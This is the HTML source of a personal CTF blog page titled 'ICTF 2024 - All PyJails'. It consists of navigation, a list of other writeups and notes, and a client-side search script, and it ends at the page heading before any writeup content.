<!DOCTYPE html>
<html lang="en">
  <head>
    <title>ICTF 2024 - All PyJails</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://fastly.jsdelivr.net/npm/mermaid@9.4.0/dist/mermaid.min.js"></script>
<script>
    mermaid.initialize({
        startOnLoad: true,
    });
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.25.0/prism.min.js" integrity="sha512-hpZ5pDCF2bRCweL5WoA0/N1elet1KYL5mx3LP555Eg/0ZguaHawxNvEjF6O3rufAChs16HVNhEc6blF/rZoowQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.25.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha512-sv0slik/5O0JIPdLBCR2A3XDg/1U3WuDEheZfI/DI5n8Yqc3h5kjrnr46FGBNiUAJF7rE4LHKwQ/SoSLRKAxEA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script src="https://cdn.jsdelivr.net/npm/lucide@0.115.0/dist/umd/lucide.min.js"></script>
<script>
    // Create callout icons
    window.addEventListener("load", () => {
        document.querySelectorAll(".callout").forEach((elem) => {
            const icon = getComputedStyle(elem).getPropertyValue('--callout-icon');
            const iconName = icon && icon.trim().replace(/^lucide-/, "");

            if (iconName) {
                const calloutTitle = elem.querySelector(".callout-title");

                if (calloutTitle) {
                    const calloutIconContainer = document.createElement("div");
                    const calloutIcon = document.createElement("i");

                    calloutIconContainer.appendChild(calloutIcon);
                    calloutIcon.setAttribute("icon-name", iconName);
                    calloutIconContainer.setAttribute("class", "callout-icon");
                    calloutTitle.insertBefore(calloutIconContainer, calloutTitle.firstChild);
                }
            }
        });

        lucide.createIcons();

        // Collapse callouts
        Array.from(document.querySelectorAll(".callout.is-collapsible")).forEach((elem) => {
            elem.querySelector('.callout-title').addEventListener("click", (event) => {
                if (elem.classList.contains("is-collapsed")) {
                    elem.classList.remove("is-collapsed");
                } else {
                    elem.classList.add("is-collapsed");
                }
            });
        });
    });
</script>


<script src="https://fastly.jsdelivr.net/npm/force-graph@1.43.0/dist/force-graph.min.js"></script>

<script defer src="https://fastly.jsdelivr.net/npm/@alpinejs/persist@3.11.1/dist/cdn.min.js"></script>
<script src="https://fastly.jsdelivr.net/npm/alpinejs@3.11.1/dist/cdn.min.js" defer></script>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.25.0/themes/prism-okaidia.min.css" integrity="sha512-mIs9kKbaw6JZFfSuo+MovjU+Ntggfoj8RwAmJbVXQ5mkAX5LlgETQEweFPI18humSPHymTb5iikEOKWF7I8ncQ==" crossorigin="anonymous" referrerpolicy="no-referrer">
<script src="https://fastly.jsdelivr.net/npm/whatwg-fetch@3.6.2/dist/fetch.umd.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<link href="/styles/digital-garden-base.css" rel="stylesheet">
    <link href="/styles/obsidian-base.css" rel="stylesheet">
    <link href="/styles/_theme.3013b531.css" rel="stylesheet">


<link href="/styles/custom-style.css" rel="stylesheet">
<link rel="icon" href="/favicon.ico" sizes="any">
<link rel="icon" href="/favicon.svg" type="image/svg+xml">
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<link rel="manifest" href="/manifest.webmanifest">





    <style>
        body.css-settings-manager { } body.theme-light.css-settings-manager { } body.theme-dark.css-settings-manager { }
    </style>

<style></style>
    
    
  </head>
  <body class="theme-light markdown-preview-view markdown-rendered markdown-preview-section css-settings-manager">
    
    
    
      
    
    <div x-init="isDesktop = (window.innerWidth>=1400) ? true: false;" 
            x-on:resize.window="isDesktop = (window.innerWidth>=1400) ? true : false;" 
            x-data="{isDesktop: true, showFilesMobile: false}">

        <div x-show.important="!isDesktop" style="display: none;">
            <nav class="navbar">
    <div class="navbar-inner">
        <span style="font-size: 1.5rem; margin-right: 10px;" @click="showFilesMobile=!showFilesMobile"><i  icon-name="menu"></i></span>
        
        <a href="/" style="text-decoration: none;">
            <h1 style="margin: 15px !important;">Shy blog</h1>
        </a>
        
    </div>
    
    
        <div class="search-button align-icon" onclick="toggleSearch()">
    <span class="search-icon">
        <i icon-name="search" ></i>
    </span>
    <span class="search-text">
        <span>Search</span>
        <span style="font-size: 0.6rem; padding: 2px 2px 0 6px; text-align:center; transform: translateY(4px);" class="search-keys">
            CTRL + K
        </span>
    </span>
</div>
    
</nav>
        </div>
        
        <div x-show="showFilesMobile && !isDesktop" @click="showFilesMobile = false" style="display:none;" class="fullpage-overlay"></div>

      <nav class="filetree-sidebar"  x-show.important="isDesktop || showFilesMobile" style="display: none;">
        
         <a href="/" style="text-decoration: none;">
               <h1 style="text-align:center;">Shy blog</h1>
         </a>
         
        
            <div style="display: flex; justify-content: center;">
                <div class="search-button align-icon" onclick="toggleSearch()">
    <span class="search-icon">
        <i icon-name="search" ></i>
    </span>
    <span class="search-text">
        <span>Search</span>
        <span style="font-size: 0.6rem; padding: 2px 2px 0 6px; text-align:center; transform: translateY(4px);" class="search-keys">
            CTRL + K
        </span>
    </span>
</div>
            </div>
        
         <div class="folder" x-data="{isOpen: true}">
    
        <div x-show="isOpen" style="display:none" class="">
            
                <div class="folder inner-folder"  x-data="{isOpen: $persist(false).as('👀Personal')}" @click.stop="isOpen=!isOpen">
                    <div class="foldername-wrapper align-icon">
                    <i x-show="isOpen" style="display: none;"  icon-name="chevron-down"></i>
                    <i x-show="!isOpen"  icon-name="chevron-right"></i>
                    <span class="foldername">👀Personal</span>
                    </div>
                    
                        
    
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/👀Personal/All my CTF participations/">All my CTF participations </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/👀Personal/All my online rankings/">All my online rankings </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/👀Personal/CTF stats/">CTF stats </a>
                </div>
            
        </div>
        
    
                    
                </div>
            
        </div>
        
    
    
        <div x-show="isOpen" style="display:none" class="">
            
                <div class="folder inner-folder"  x-data="{isOpen: $persist(false).as('👩‍🏫Writeups')}" @click.stop="isOpen=!isOpen">
                    <div class="foldername-wrapper align-icon">
                    <i x-show="isOpen" style="display: none;"  icon-name="chevron-down"></i>
                    <i x-show="!isOpen"  icon-name="chevron-right"></i>
                    <span class="foldername">👩‍🏫Writeups</span>
                    </div>
                    
                        
    
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/👩‍🏫Writeups/ALL WRITEUPS/">ALL WRITEUPS </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/👩‍🏫Writeups/GCC CTF 2024 - Legerdemain/">GCC CTF 2024 - Legerdemain </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/👩‍🏫Writeups/GCC CTF 2024 - OSINT/">GCC CTF 2024 - OSINT </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink active-note"><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/👩‍🏫Writeups/ICTF 2024 - All PyJails/">ICTF 2024 - All PyJails </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/👩‍🏫Writeups/NBCTF 2024 - Game Hacking/">NBCTF 2024 - Game Hacking </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/👩‍🏫Writeups/UIUCTF 2023 - OSINT/">UIUCTF 2023 - OSINT </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/👩‍🏫Writeups/UIUCTF 2025 - OSINT/">UIUCTF 2025 - OSINT </a>
                </div>
            
        </div>
        
    
                    
                </div>
            
        </div>
        
    
    
        <div x-show="isOpen" style="display:none" class="">
            
                <div class="folder inner-folder"  x-data="{isOpen: $persist(false).as('📝Notes')}" @click.stop="isOpen=!isOpen">
                    <div class="foldername-wrapper align-icon">
                    <i x-show="isOpen" style="display: none;"  icon-name="chevron-down"></i>
                    <i x-show="!isOpen"  icon-name="chevron-right"></i>
                    <span class="foldername">📝Notes</span>
                    </div>
                    
                        
    
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div class="folder inner-folder"  x-data="{isOpen: $persist(false).as('📝Notes/🐍Python')}" @click.stop="isOpen=!isOpen">
                    <div class="foldername-wrapper align-icon">
                    <i x-show="isOpen" style="display: none;"  icon-name="chevron-down"></i>
                    <i x-show="!isOpen"  icon-name="chevron-right"></i>
                    <span class="foldername">🐍Python</span>
                    </div>
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div class="folder inner-folder"  x-data="{isOpen: $persist(false).as('📝Notes/🐍Python/Basiques')}" @click.stop="isOpen=!isOpen">
                    <div class="foldername-wrapper align-icon">
                    <i x-show="isOpen" style="display: none;"  icon-name="chevron-down"></i>
                    <i x-show="!isOpen"  icon-name="chevron-right"></i>
                    <span class="foldername">Basiques</span>
                    </div>
                    
                        
    
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/📝Notes/🐍Python/Basiques/Args et kwargs/">Args et kwargs </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/📝Notes/🐍Python/Basiques/Expressions anonymes/">Expressions anonymes </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/📝Notes/🐍Python/Basiques/Fonctions de base/">Fonctions de base </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/📝Notes/🐍Python/Basiques/Modules de base/">Modules de base </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/📝Notes/🐍Python/Basiques/Opérateurs tertiaire/">Opérateurs tertiaire </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/📝Notes/🐍Python/Basiques/Paramètres cachés/">Paramètres cachés </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/📝Notes/🐍Python/Basiques/T par compréhension/">T par compréhension </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/📝Notes/🐍Python/Basiques/Types de base/">Types de base </a>
                </div>
            
        </div>
        
    
                    
                </div>
            
        </div>
        
    
                    
                        
    
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/📝Notes/🐍Python/Topo général/">Topo général </a>
                </div>
            
        </div>
        
    
                    
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div class="folder inner-folder"  x-data="{isOpen: $persist(false).as('📝Notes/🕵️‍♂️OSINT')}" @click.stop="isOpen=!isOpen">
                    <div class="foldername-wrapper align-icon">
                    <i x-show="isOpen" style="display: none;"  icon-name="chevron-down"></i>
                    <i x-show="!isOpen"  icon-name="chevron-right"></i>
                    <span class="foldername">🕵️‍♂️OSINT</span>
                    </div>
                    
                        
    
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
        </div>
        
    
                    
                </div>
            
        </div>
        
    
                    
                </div>
            
        </div>
        
    
    
        <div x-show="isOpen" style="display:none" class="">
            
                <div class="folder inner-folder"  x-data="{isOpen: $persist(false).as('🗃CTF  details')}" @click.stop="isOpen=!isOpen">
                    <div class="foldername-wrapper align-icon">
                    <i x-show="isOpen" style="display: none;"  icon-name="chevron-down"></i>
                    <i x-show="!isOpen"  icon-name="chevron-right"></i>
                    <span class="foldername">🗃CTF  details</span>
                    </div>
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div class="folder inner-folder"  x-data="{isOpen: $persist(false).as('🗃CTF  details/2023')}" @click.stop="isOpen=!isOpen">
                    <div class="foldername-wrapper align-icon">
                    <i x-show="isOpen" style="display: none;"  icon-name="chevron-down"></i>
                    <i x-show="!isOpen"  icon-name="chevron-right"></i>
                    <span class="foldername">2023</span>
                    </div>
                    
                        
    
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2023/Down-Under-2023/">Down-Under-2023 </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2023/ECW-2023-final/">ECW-2023-final </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2023/ECW-2023/">ECW-2023 </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2023/LakeCTF-2023/">LakeCTF-2023 </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2023/MapleCTF-2023/">MapleCTF-2023 </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2023/NewportBlake-2023/">NewportBlake-2023 </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2023/VSCTF-2023/">VSCTF-2023 </a>
                </div>
            
        </div>
        
    
                    
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div class="folder inner-folder"  x-data="{isOpen: $persist(false).as('🗃CTF  details/2024')}" @click.stop="isOpen=!isOpen">
                    <div class="foldername-wrapper align-icon">
                    <i x-show="isOpen" style="display: none;"  icon-name="chevron-down"></i>
                    <i x-show="!isOpen"  icon-name="chevron-right"></i>
                    <span class="foldername">2024</span>
                    </div>
                    
                        
    
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2024/Breizh-CTF-2024/">Breizh-CTF-2024 </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2024/ECW-2024/">ECW-2024 </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2024/GCC-CTF-2024/">GCC-CTF-2024 </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2024/Hackday-2024/">Hackday-2024 </a>
                </div>
            
        </div>
        
    
                    
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div class="folder inner-folder"  x-data="{isOpen: $persist(false).as('🗃CTF  details/2025')}" @click.stop="isOpen=!isOpen">
                    <div class="foldername-wrapper align-icon">
                    <i x-show="isOpen" style="display: none;"  icon-name="chevron-down"></i>
                    <i x-show="!isOpen"  icon-name="chevron-right"></i>
                    <span class="foldername">2025</span>
                    </div>
                    
                        
    
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2025/Breizh-CTF-2025/">Breizh-CTF-2025 </a>
                </div>
            
        </div>
        
    
                    
                        
    
        <div x-show="isOpen" style="display:none" class="filelist">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/🗃CTF  details/2025/DaVinciCTF-2025/">DaVinciCTF-2025 </a>
                </div>
            
        </div>
        
    
                    
                </div>
            
        </div>
        
    
                    
                        
    
    
                    
                </div>
            
        </div>
        
    
    
        <div x-show="isOpen" style="display:none" class="">
            
                <div @click.stop class="notelink "><i icon-name="sticky-note" aria-hidden="true"></i><a data-note-icon="" style="text-decoration: none;" class="filename" href="/">Hey </a>
                </div>
            
        </div>
        
    </div>
      </nav>
    </div>

    

    
      <div class="search-container" id="globalsearch" onclick="toggleSearch()">
    <div class="search-box">
        <input type="search" id="term" placeholder="Start typing...">
        <div id="search-results"></div>
        <footer class="search-box-footer">
            <div class="navigation-hint">
                <span>Enter to select</span>
            </div>

            <div class="navigation-hint align-icon">
                <i  icon-name="arrow-up" aria-hidden="true"></i>
                <i  icon-name="arrow-down" aria-hidden="true"></i>
                <span>to navigate</span>
            </div>

            <div class="navigation-hint">
                <span>ESC to close</span>
            </div>

        </footer>
    </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js"></script>
<script>
    document.addEventListener('DOMContentLoaded', init, false);
    document.addEventListener('DOMContentLoaded', setCorrectShortcut, false);

    window.toggleSearch = function () {
        if (document.getElementById('globalsearch').classList.contains('active')) {
            document
                .getElementById('globalsearch')
                .classList
                .remove('active');
        } else {
            document
                .getElementById('globalsearch')
                .classList
                .add('active');
            document
                .getElementById('term')
                .focus();
        }
    }

    window.toggleTagSearch = function (evt) {
        console.log(evt.textContent);
        const term = evt.textContent;
        if (term) {
            window
                .document
                .getElementById('term')
                .value = term.trim();
            window.toggleSearch();
            window.search();
        }
    }

    const loadingSvg = `
    <svg width="100" height="100" viewBox="0 0 45 45" xmlns="http://www.w3.org/2000/svg" stroke="#fff">
      <g fill="none" fill-rule="evenodd" transform="translate(1 1)" stroke-width="2">
          <circle cx="22" cy="22" r="6" stroke-opacity="0">
              <animate attributeName="r"
                   begin="1.5s" dur="3s"
                   values="6;22"
                   calcMode="linear"
                   repeatCount="indefinite" />
              <animate attributeName="stroke-opacity"
                   begin="1.5s" dur="3s"
                   values="1;0" calcMode="linear"
                   repeatCount="indefinite" />
              <animate attributeName="stroke-width"
                   begin="1.5s" dur="3s"
                   values="2;0" calcMode="linear"
                   repeatCount="indefinite" />
          </circle>
          <circle cx="22" cy="22" r="6" stroke-opacity="0">
              <animate attributeName="r"
                   begin="3s" dur="3s"
                   values="6;22"
                   calcMode="linear"
                   repeatCount="indefinite" />
              <animate attributeName="stroke-opacity"
                   begin="3s" dur="3s"
                   values="1;0" calcMode="linear"
                   repeatCount="indefinite" />
              <animate attributeName="stroke-width"
                   begin="3s" dur="3s"
                   values="2;0" calcMode="linear"
                   repeatCount="indefinite" />
          </circle>
          <circle cx="22" cy="22" r="8">
              <animate attributeName="r"
                   begin="0s" dur="1.5s"
                   values="6;1;2;3;4;5;6"
                   calcMode="linear"
                   repeatCount="indefinite" />
          </circle>
      </g>
  </svg>`;

    function debounce(func, wait, immediate) {
        var timeout;
        return function () {
            var context = this,
                args = arguments;
            var later = function () {
                timeout = null;
                if (!immediate) 
                    func.apply(context, args);
                };
            var callNow = immediate && !timeout;
            clearTimeout(timeout);
            timeout = setTimeout(later, wait);
            if (callNow) 
                func.apply(context, args);
            };
    };

    function setCorrectShortcut() {
        if (navigator.platform.toUpperCase().indexOf('MAC') >= 0) {
            document
                .querySelectorAll(".search-keys")
                .forEach(x => x.innerHTML = "⌘ + K");
        }
    }

    function createIndex(posts) {
        const encoder = (str) => str
            .toLowerCase()
            .split(/([^a-z]|[^\x00-\x7F])/)
        const contentIndex = new FlexSearch.Document({
            cache: true,
            charset: "latin:extra",
            optimize: true,
            index: [
                {
                    field: "content",
                    tokenize: "reverse",
                    encode: encoder
                }, {
                    field: "title",
                    tokenize: "forward",
                    encode: encoder
                }, {
                    field: "tags",
                    tokenize: "forward",
                    encode: encoder
                }
            ]
        })
        posts.forEach((p, idx) => {
            contentIndex.add({
                id: idx, title: p.title, content: p.content, tags: p.tags //Change to removeHTML
            })
        });
        return contentIndex;
    }

    async function init() {
        //init offline search index

        const searchIndexDate = '2025-08-17T19:14:18.225Z';
        let shouldFetch = true;
        if(localStorage.getItem("searchIndex")) {
            let {date, docs}= JSON.parse(localStorage.getItem('searchIndex'));
            if(date === searchIndexDate){
                shouldFetch = false;
                let index = createIndex(docs);
                window.docs = docs
                window.index = index;
            }        
        }
        if(shouldFetch){
            let docs = await(await fetch('/searchIndex.json?v=2025-08-17T19:14:18.225Z')).json();
            let index = createIndex(docs);
            localStorage.setItem("searchIndex", JSON.stringify({date: '2025-08-17T19:14:18.225Z', docs}));
            window.docs = docs
            window.index = index;
        }

        //open searchmodal when ctrl + k is pressed, cmd + k on mac
        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
                e.preventDefault();
                toggleSearch();
            }
            if (e.key === 'Escape') {
                document
                    .getElementById('globalsearch')
                    .classList
                    .remove('active');
            }

            //navigate search results with arrow keys
            if (document.getElementById('globalsearch').classList.contains('active')) {
                if (e.key === 'ArrowDown') {
                    e.preventDefault();
                    let active = document.querySelector('.searchresult.active');
                    if (active) {
                        active
                            .classList
                            .remove('active');
                        if (active.nextElementSibling) {
                            active
                                .nextElementSibling
                                .classList
                                .add('active');
                        } else {
                            document
                                .querySelector('.searchresult')
                                .classList
                                .add('active');
                        }
                    } else {
                        document
                            .querySelector('.searchresult')
                            .classList
                            .add('active');
                    }

                    let currentActive = document.querySelector('.searchresult.active');
                    if (currentActive) {
                        currentActive.scrollIntoView({behavior: 'smooth', block: 'nearest', inline: 'start'});
                    }
                }
                if (e.key === 'ArrowUp') {
                    e.preventDefault();
                    let active = document.querySelector('.searchresult.active');
                    if (active) {
                        active
                            .classList
                            .remove('active');
                        if (active.previousElementSibling) {
                            active
                                .previousElementSibling
                                .classList
                                .add('active');
                        } else {
                            document
                                .querySelectorAll('.searchresult')
                                .forEach((el) => {
                                    if (!el.nextElementSibling) {
                                        el
                                            .classList
                                            .add('active');
                                    }
                                });
                        }
                    } else {
                        document
                            .querySelectorAll('.searchresult')
                            .forEach((el) => {
                                if (el.nextElementSibling) {
                                    el
                                        .classList
                                        .add('active');
                                }
                            });
                    }

                    let currentActive = document.querySelector('.searchresult.active');
                    if (currentActive) {
                        currentActive.scrollIntoView({behavior: 'smooth', block: 'nearest', inline: 'start'});
                    }

                }
                if (e.key === 'Enter') {
                    e.preventDefault();
                    let active = document.querySelector('.searchresult.active');
                    if (active) {
                        window.location.href = active
                            .querySelector("a")
                            .href;
                    }
                }
            }
        });

        const debouncedSearch = debounce(search, 200, false);
        field = document.querySelector('#term');
        field.addEventListener('keydown', (e) => {
            if (e.key !== 'ArrowDown' && e.key !== 'ArrowUp') {
                debouncedSearch();
            }
        });
        resultsDiv = document.querySelector('#search-results');

        const params = new URL(location.href).searchParams;
        if (params.get('q')) {
            field.setAttribute('value', params.get('q'));
            toggleSearch();
            search();
        }
    }
    window.lastSearch = '';
    async function search() {
        let search = field
            .value
            .trim();
        if (!search) 
            return;
        if (search == lastSearch) 
            return;
        console.log(`search for ${search}`);
        window.lastSearch = search;

        resultsDiv.innerHTML = loadingSvg;
        //let searchRequest = await fetch(`/api/search?term=${encodeURIComponent(search)}`);
        //let results = await searchRequest.json();
        let results = offlineSearch(search);
        let resultsHTML = '';
        if (!results.length) {
            let resultParagraph = document.createElement("p");
            resultParagraph.innerText = `No results for "${search}"`;
            resultsDiv.innerHTML = '';
            resultsDiv.appendChild(resultParagraph);
            return;
        }
        resultsHTML += '<div style="max-width:100%;">';
        // we need to add title, url from ref
        results.forEach(r => {
            if(r.tags && r.tags.length > 0){
                resultsHTML += `<div class="searchresult">
                    <a class="search-link" href="${r.url}">${r.title}</a>
                    <div onclick="window.location='${r.url}'">
                        <div class="header-meta">
                            <div class="header-tags">
                                ${r.tags.map(tag=>'<a class="tag" href="JavaScript:Void(0);">#'+tag+'</a>').join("")}
                            </div>
                        </div>
                        ${r.content}
                    </div>
                </div>`;
            } else {
                resultsHTML += `<div class="searchresult">
                    <a class="search-link" href="${r.url}">${r.title}</a>
                    <div onclick="window.location='${r.url}'">
                        ${r.content}
                    </div>
                </div>`;
            }
        });
        resultsHTML += '</div>';
        resultsDiv.innerHTML = resultsHTML;
    }

    function truncate(str, size) {
        //first, remove HTML
        str = str.replaceAll(/<[^>]*>/g, '');
        if (str.length < size) 
            return str;
        return str.substring(0, size - 3) + '...';
    }

    function offlineSearch(searchQuery) {
        let data = window.docs;

        let isTagSearch = searchQuery[0] === "#" && searchQuery.length > 1;

        let searchResults = isTagSearch
            ? index.search(searchQuery.substring(1), [
                {
                    field: "tags"
                }
            ])
            : index.search(searchQuery, [
                {
                    field: "title",
                    limit: 5
                }, {
                    field: "content",
                    weight: 10
                }
            ]);

        const getByField = (field) => {
            const results = searchResults.filter((x) => x.field === field)
            if (results.length === 0) {
                return []
            } else {
                return [...results[0].result]
            }
        }
        const allIds = new Set([
            ...getByField("title"),
            ...getByField("content"),
            ...getByField("tags")
        ])
        const dataIds = [...allIds];
        const finalResults = dataIds.map((id) => {
            let result = data[id];
            result.content = truncate(result.content, 400);
            result.tags = result
                .tags
                .filter((x) => x != "gardenEntry" && x != "note"); //Note is automatically added by 11ty. GardenEntry is used internally to mark the home page

            return result;
        })
        return finalResults;

    }
</script>
    

    <main class="content cm-s-obsidian ">
      <header>
        
        <div class="header-meta">
          
            <div class="header-tags">
              
                
              
                
                  <a class="tag" onclick="toggleTagSearch(this)">
                    #Writeup
                  </a>
                
              
                
                  <a class="tag" onclick="toggleTagSearch(this)">
                    #ICTF
                  </a>
                
              
                
                  <a class="tag" onclick="toggleTagSearch(this)">
                    #Misc
                  </a>
                
              
            </div>
          </div>
      
      
      </header>
      
      
      <h1 id="ictf-2024-em-all-py-jails-em-any" tabindex="-1">ICTF 2024 - <em>All PyJails</em> 『ANY %』</h1>
